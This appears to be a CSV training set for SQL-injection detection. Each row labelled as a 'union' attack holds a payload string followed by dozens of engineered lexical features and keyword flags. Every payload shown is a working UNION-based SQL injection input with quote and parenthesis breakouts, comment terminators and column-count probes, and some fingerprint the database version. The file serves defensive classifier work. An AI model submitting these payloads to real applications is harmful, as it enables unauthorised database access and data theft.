id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000365,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R001163,0.23677248123191114,46.82370184802676,19.0,3.7612891694209254,14.0,23.058961478421413,4.0,5.764740369605352,0.2996454332013688,0.4917932687071635,0.08561298091467681,0.12294831717679088,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,3.764740369605353,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000366,attack,union,"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",nearest_attack_euclidean,R000535,0.09156139573650779,86.26368812240702,21.0,3.690358609517221,14.0,43.41095049792561,14.0,14.852737624481403,0.1623645032641298,0.5031049083170198,0.16236450326412977,0.17216608515472062,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,8.852737624481403,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000367,attack,union,"-7418 union all select 1340,1340,1340,1340,1340#",nearest_attack_euclidean,R001175,0.2787333210552809,50.03542469852553,20.0,3.9364986670331312,14.0,25.628339758820427,4.0,6.407084939705108,0.2804654301181771,0.5115212718784464,0.08013298003376489,0.1278803179696116,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,4.407084939705107,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000368,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R001511,0.16665724587244124,85.28113491457495,27.128113491457498,4.130029136425549,29.0,29.02490793165996,15.0,12.25622698291499,0.34053281249712847,0.3396935775900884,0.17613766163644576,0.14363594827633736,3.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,3.25622698291499,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000369,attack,union,"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",nearest_attack_euclidean,R001058,0.16837726953319507,84.75397040365674,22.750794080731346,3.57417009613113,14.0,39.003176322925384,18.0,13.750794080731346,0.16529492023382225,0.45996473551899425,0.2125220403006286,0.16221830394655493,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,0.0,0.0,7.750794080731346,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000370,attack,union,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",nearest_attack_euclidean,R000873,0.22401379365745666,69.8189230114973,22.23621539770054,3.743505698001572,14.0,31.055138409197838,14.0,10.76378460229946,0.2007117110198544,0.444453540479115,0.2007117110198544,0.15412303748117612,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,5.763784602299459,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000371,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000700,0.1551393485063613,78.96734836994135,24.20653032601173,3.8131032356134718,40.17387869595308,9.0,22.0,7.79346967398827,0.5082587522336877,0.11415961869116567,0.27905684568951616,0.0985247833856305,1.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,2.7934696739882696,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000372,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000838,0.047219551683735705,75.63834151430693,21.0,3.5756907335637544,14.0,31.710673211445542,18.0,11.927668302861385,0.18514885448474852,0.4191223564885173,0.23804852719467665,0.15768026183205747,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,0.0,0.0,5.927668302861385,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000373,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000945,0.24125793834325285,64.9012409376565,16.0,3.2143097047071594,39.520992750125195,1.0,14.0,10.3802481875313,0.6079045100473988,0.015491571770371082,0.21688200478519498,0.15972191339703523,0.0,1.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,5.3802481875313,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000374,attack,union,"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",nearest_attack_euclidean,R000529,0.15238533685028957,92.79219849231005,25.919479899487335,3.862364288091911,19.0,51.03375879384804,10.0,12.75843969846201,0.20521791390332733,0.5494181261812003,0.1080094283701723,0.13735453154530008,1.0,0.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,8.75843969846201,2.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000375,attack,union," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000044,0.0034654975542492525,78.0,27.986131559944766,3.9431454575736726,40.0,2.9999999999999982,24.0,11.0,0.5128205128205128,0.038461538461538464,0.3076923076923077,0.14102564102564102,0.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000376,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000259,0.031869704307473525,35.0,20.0,3.9335503931045563,14.0,8.0,8.0,5.0,0.4,0.22857142857142856,0.22857142857142856,0.14285714285714285,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000377,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,1.2279814695395241,98.13369419438614,25.43315290280693,4.024309400264501,62.0,4.566847097193071,23.56684709719307,8.0,0.6318557700664438,0.046490616645858934,0.2401238365049304,0.08152977678276693,0.0,0.0,2.0,-2.168404344971009e-19,1.5668470971930706,2.0,0.0,0.0,0.0,0.0,1.0,5.566847097193071,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000378,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000468,0.07010347398543136,70.8094455169965,23.0,3.807712899502343,39.62265039768962,9.0,14.124530079537923,8.062265039768961,0.5592112138856127,0.12731755427659747,0.1995498912787786,0.11392134055901124,0.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,4.0622650397689615,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000379,attack,union,"1 where 2751  =  2751 union all select null,null,null,null--",nearest_attack_euclidean,R000672,0.2084621405470086,61.44789804318581,21.0,3.820679398374499,36.15831843454865,9.0,10.0,6.289579608637162,0.5881596601439527,0.14665869682341737,0.16295410758157486,0.10222753545105509,0.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,3.289579608637162,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000380,attack,union,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",nearest_attack_euclidean,R000374,0.40368037727109585,99.15869032691535,27.656087311538975,4.103751522501515,29.0,40.12695226153228,15.0,15.03173806538307,0.2939096213663337,0.4027152704289559,0.15202221794810364,0.15135289025660684,3.0,0.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,6.03173806538307,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000381,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000032,0.0830735970103702,81.09778063132997,32.09778063132997,4.254335099785335,42.0,4.0,22.0,13.09778063132997,0.5179002128100182,0.049323829791430324,0.2712810638528667,0.16149489354568472,3.0,0.0,2.0,-2.168404344971009e-19,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.09778063132997,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000382,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000410,0.41221796223456914,58.31908508982745,22.53618298203451,3.872532146184994,14.0,21.855268071861964,14.0,8.463817017965491,0.2404955529105432,0.373979306272752,0.2404955529105432,0.14502958790616155,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,3.463817017965491,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000383,attack,union,-7707'   )    )    union all select 3172#,nearest_attack_euclidean,R001408,0.11202142814176892,41.0,19.892666790277346,3.633393984354905,14.0,8.0,14.0,5.0,0.34146341463414637,0.1951219512195122,0.34146341463414637,0.12195121951219512,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000384,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000833,0.015671146667028703,75.0,21.0,3.5798026701280623,14.0,40.0,8.0,13.0,0.18666666666666668,0.5333333333333333,0.10666666666666667,0.17333333333333334,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000385,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001225,0.05658794685689501,68.0,17.0,3.210319073613217,38.151905750436896,1.0,17.8480942495631,11.0,0.561057437506425,0.01470588235294118,0.2624719742582809,0.16176470588235295,0.0,1.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.962023562390775,1.0,0.0,5.037976437609225,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000386,attack,union,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",nearest_attack_euclidean,R000971,0.2525997732038663,76.89021760087768,25.621956479824465,4.101862712504506,42.51217408070214,9.0,15.0,10.378043520175535,0.5519489525744063,0.11749786457001801,0.19582977428336337,0.1347234085722122,3.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,2.3780435201755346,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000387,attack,union,"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",nearest_attack_euclidean,R001426,0.3947646957374415,81.01259362336269,24.0,3.674952947319733,19.0,41.61007489869015,10.0,10.402518724672538,0.23532186633785535,0.5126596158400925,0.12385361386202913,0.1281649039600231,1.0,0.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,6.402518724672538,2.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000388,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000800,0.400819691416511,59.93224890775012,26.310749635916707,4.062594269519527,20.864497815500236,18.757001456333178,14.621499271833411,5.6892503640832945,0.34726425420100093,0.3138376456447936,0.24374438828039083,0.09515371187381456,0.0,1.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.6892503640832945,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000389,attack,union,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",nearest_attack_euclidean,R000808,0.5633957339207597,71.59409362805688,20.34059063719431,3.6726569802325906,14.0,30.637637451222755,16.637637451222755,10.318818725611377,0.19644773111942637,0.42806396158848947,0.2316162304690631,0.14387207682302103,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.6594093628056887,0.0,0.0,5.659409362805689,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000390,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R001343,0.45720990931249234,71.59252403415921,22.45925240341592,3.6745792935183905,14.0,31.674019227327374,14.0,11.918504806831844,0.19649247209183385,0.44069947960350375,0.19649247209183388,0.16631557621282847,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,1.0,0.0,5.918504806831843,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000391,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000415,0.6659515347427191,88.77345996107375,29.69336499026844,4.301218679629475,40.67962011677873,19.40047485402659,17.0,11.693364990268439,0.459760696634413,0.21698704105899522,0.19158283987877855,0.13166942242781324,3.0,0.0,2.6933649902684396,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,2.0,5.69336499026844,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000392,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R000272,0.24159437614210572,70.99947466767205,22.0,3.8127178633906262,14.0,36.0,8.856692572290324,12.14278209538172,0.19740396190215057,0.5076101877483871,0.12392814150629801,0.17105770884316437,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.1427820953817207,1.0,0.0,7.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000393,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,0.25835896550360793,67.94532694803047,23.0,3.8273806664308476,36.556261558424374,9.0,14.0,8.389065389606094,0.537206303762947,0.13287321719850992,0.20669167119768211,0.12322880784086093,1.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,3.3890653896060936,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000394,attack,union,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",nearest_attack_euclidean,R000637,0.32792679506257555,57.85166383766513,24.0,3.964086914455024,19.0,18.281331070132104,14.0,6.570332767533026,0.3290358748740493,0.31510502650140104,0.24244748674929945,0.11341161187525019,0.0,1.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.5703327675330256,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000395,attack,union,"-1184""   )    )     )   union all select 1482--",nearest_attack_euclidean,R000232,0.20281289937179842,47.724914182093016,18.43494850925581,3.4208782634648642,14.0,8.579931345674412,18.0,7.144982836418603,0.2937198041942298,0.1789924139893426,0.3776397482497241,0.14964803356670345,0.0,1.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,0.0,0.0,0.14498283641860343,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000396,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000346,0.6249062567445812,80.49227274499897,25.84496503769215,3.7796502243168453,21.53489511307645,33.6899300753843,14.844965037692148,10.422482518846074,0.2663278714129929,0.41924121633543265,0.18461826657529176,0.1298126456762827,1.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,4.422482518846074,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000397,attack,union,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",nearest_attack_euclidean,R001487,0.18271479618619207,83.64100264644202,25.0,3.8183703805499944,43.91280211715362,9.0,22.0,8.728200529288404,0.5248151560100245,0.10768102590912085,0.26322028555562876,0.1042835325252259,0.0,1.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,3.7282005292884053,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
